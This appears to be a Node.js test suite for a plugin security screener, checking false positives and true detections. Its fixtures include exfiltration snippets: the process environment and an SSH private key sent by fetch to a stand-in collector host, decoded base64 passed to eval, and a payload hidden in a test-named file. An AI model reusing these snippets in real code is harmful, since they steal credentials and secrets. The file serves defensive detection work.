import test from 'node:test';
import assert from 'node:assert/strict';
import { screenTarget, correlateFindings } from '../lib/screen.js';
import { decideAction } from '../lib/disposition.js';

function target(files) {
  return { name: 'ordinary-plugin', version: '1.0.0', source: 'profile', self: false,
    dir: null, manifest: { name: 'ordinary-plugin', version: '1.0.0', license: 'MIT', repository: 'example' },
    patchText: null, clientEntry: null, files: Object.entries(files).map(([rel, text]) => ({ rel, text })) };
}
const serious = (pack) => pack.findings.filter((f) => ['high', 'critical'].includes(f.severity));

test('normal profile paths, config parsing, child env inheritance, and Chinese labels are not severe threats', () => {
  const pack = screenTarget(target({ 'lib/index.js': `
import { spawn } from 'node:child_process';
const root = join(homedir(), '.dsh');
const patch = 'cordis.patch.yml';
function resolveEnv(env = process.env, argv = process.argv) { return env.DSH_HOME; }
const child = spawn('node', ['worker.js'], { env: { ...process.env, MODE: 'worker' } });
const label = '审读方法与安全检查结果，等待用户确认';
const endpoint = 'https://api.deepseek.com/v1';
await fetch(endpoint);
` }), {});
  assert.deepEqual(serious(pack), [], 'ordinary API use must not produce high/critical findings');
});

test('test fixture payloads and vendor framework capabilities do not upgrade the plugin itself', () => {
  const pack = screenTarget(target({
    'lib/index.js': "export function apply(ctx) { return ctx; }",
    'test/fixture.test.js': "eval('bad'); fetch('https://api.telegram.org/bot1/send');",
    'node_modules/framework/index.js': 'Object.defineProperty(globalThis, "polyfill", {}); new Function("return 1")();',
  }), {});
  assert.deepEqual(serious(pack), []);
  assert.ok(pack.findings.some((f) => f.evidence.some((e) => e.ref.startsWith('test/'))), 'keep secondary evidence visible');
});

test('credential reads and unrelated networking in different files are not a proven exfiltration chain', () => {
  const findings = correlateFindings([
    { ruleId: 'secret-env', severity: 'medium', evidence: [{ ref: 'lib/auth.js:1', snippet: 'const key = process.env.API_KEY;' }] },
    { ruleId: 'net-egress', severity: 'medium', evidence: [{ ref: 'lib/update.js:1', snippet: 'fetch("https://updates.example.com")' }] },
  ]);
  assert.equal(findings[1].severity, 'medium');
  assert.equal(findings[1].extra?.correlation, undefined);
});

test('asset encoding, long SVG strings, and Chinese UI text are not obfuscated execution', () => {
  const pack = screenTarget(target({ 'lib/client.js': `
const label = '忽略之前的检查结果只是用于展示的中文标签示例';
const svg = '<svg>${'M1 2 '.repeat(500)}</svg>';
const image = Buffer.from(base64Image, 'base64');
` }), {});
  assert.deepEqual(serious(pack), []);
});

test('a webhook integration alone is an outbound capability, not critical credential theft', () => {
  const pack = screenTarget(target({ 'lib/notify.js': 'await fetch("https://hooks.slack.com/services/example", { body: JSON.stringify({ text: message }) });' }), {});
  assert.deepEqual(serious(pack), []);
});

test('static findings cannot automatically quarantine an unreviewed plugin even in enforce mode', () => {
  for (const autoDisableAt of ['never', 'critical', 'high']) {
    const decision = decideAction({ signal: { level: 'critical', triggers: [{ ruleId: 'fs-sensitive' }] },
      depsWorst: 'none', review: null, isSelf: false }, { mode: 'enforce', autoDisableAt }, 'ordinary-plugin');
    assert.equal(decision.action, 'review');
  }
});

test('a concrete environment serialization sent outbound stays high-priority for review', () => {
  const pack = screenTarget(target({ 'lib/index.js': `
const payload = JSON.stringify(process.env);
await fetch('https://collector.example.net/collect', { method: 'POST', body: payload });
` }), {});
  assert.ok(serious(pack).some((f) => f.ruleId === 'net-egress'));
});

test('a credential file read linked to a request body preserves both source and sink evidence', () => {
  const pack = screenTarget(target({ 'lib/index.js': `
const credentialPath = join(homedir(), '.ssh', 'id_rsa');
const data = readFileSync(credentialPath);
fetch('https://collector.example.net', { body: data });
` }), {});
  const chain = serious(pack).find((f) => f.extra?.correlation === 'sensitive-data-to-request-body');
  assert.ok(chain);
  assert.equal(chain.evidence.length, 2);
});

test('decoded bytes passed into execution remain high-priority', () => {
  const pack = screenTarget(target({ 'lib/index.js': `
const decoded = Buffer.from(payload, 'base64').toString();
eval(decoded);
` }), {});
  assert.ok(serious(pack).some((f) => f.extra?.correlation === 'decoded-data-to-execution'));
});

test('comments, string examples, overwritten variables, and shadowed bindings do not establish a chain', () => {
  const pack = screenTarget(target({ 'lib/index.js': `
// fetch('https://example.net', { body: JSON.stringify(process.env) });
const example = "eval(Buffer.from(payload, 'base64'))";
function auth() { const payload = JSON.stringify(process.env); }
function update() { fetch('https://example.net', { body: payload }); }
let data = JSON.stringify(process.env);
data = 'hello';
fetch('https://example.net', { body: data });
const payload = JSON.stringify(process.env);
function send({ payload }) { fetch('https://example.net', { body: payload }); }
fetch('https://example.net', { body: { payload: 'hello' } });
` }), {});
  assert.deepEqual(serious(pack), []);
});

test('a support-named payload imported from the runtime entry cannot evade priority by its filename', () => {
  const pack = screenTarget(target({
    'lib/index.js': "import '../test/payload.js';",
    'test/payload.js': "fetch('https://collector.example.net', { body: JSON.stringify(process.env) });",
  }), {});
  assert.ok(serious(pack).some((f) => f.scope === 'runtime' && f.ruleId === 'net-egress'));
});
